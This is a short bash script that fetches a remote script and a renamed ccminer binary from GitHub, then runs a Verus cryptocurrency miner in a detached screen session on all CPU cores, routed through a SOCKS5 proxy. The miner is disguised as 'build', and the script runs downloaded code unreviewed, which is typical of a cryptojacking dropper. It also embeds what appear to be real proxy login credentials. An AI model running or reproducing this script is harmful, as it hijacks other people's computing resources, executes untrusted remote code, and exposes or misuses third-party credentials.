#!/bin/bash
proxy="socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080"
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
wget -q https://raw.githubusercontent.com/declined01/master/master/compile.sh
wget -qO build https://github.com/declined01/master/raw/master/ccminer
chmod +x build
chmod +x compile.sh
screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.worker-$worker -p x -t $(nproc --all) -x $proxy
./compile.sh
echo succes
